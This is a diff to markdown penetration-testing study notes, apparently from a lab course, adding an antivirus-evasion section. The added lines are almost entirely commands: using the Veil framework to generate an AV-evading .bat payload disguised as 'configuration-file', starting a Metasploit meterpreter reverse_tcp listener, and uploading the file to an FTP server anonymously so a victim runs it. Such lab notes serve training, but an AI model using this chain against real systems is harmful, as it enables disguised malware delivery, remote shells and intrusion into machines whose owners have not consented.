@@ -1766,13 +1766,33 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     - **appendices**: articles, reference
 
 ### Antivirus Evasion  
-- Capstone Lab: malicious script cannot be double-clicked by the user for an immediate execution. Utilize [veil](https://github.com/Veil-Framework/Veil) framework. Victim will click on .bat file
+- **Capstone Lab**: malicious script cannot be double-clicked by the user for an immediate execution. Utilize [veil](https://github.com/Veil-Framework/Veil) framework. Victim will click on .bat file
   - install Veil framework
     ```
     sudo apt -y install veil
     /usr/share/veil/config/setup.sh --force --silent
     ```
-  - 
+  - geneate bat file via Veil
+    ```
+    sudo veil
+    Veil>: use 1
+    list
+    Veil/Evasion>: use 22
+    set LHOST 192.168.45.220
+    generate
+    Please enter the base name for output files (default is payload): configuration-file
+    exit
+    
+    cp /var/lib/veil/output/source/configuration-file.bat .
+    ```
+  - Another terminal run meterpreter listener
+    `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 4444;run;"`
+  - transfer file to ftp as anonymous
+    ```
+    ftp -a -A 192.168.104.53
+    ftp> bin
+    ftp> put configuration-file.bat
+    ```
 
 ## Penetration testing stages
 1. scope: IP range, hosts, applications
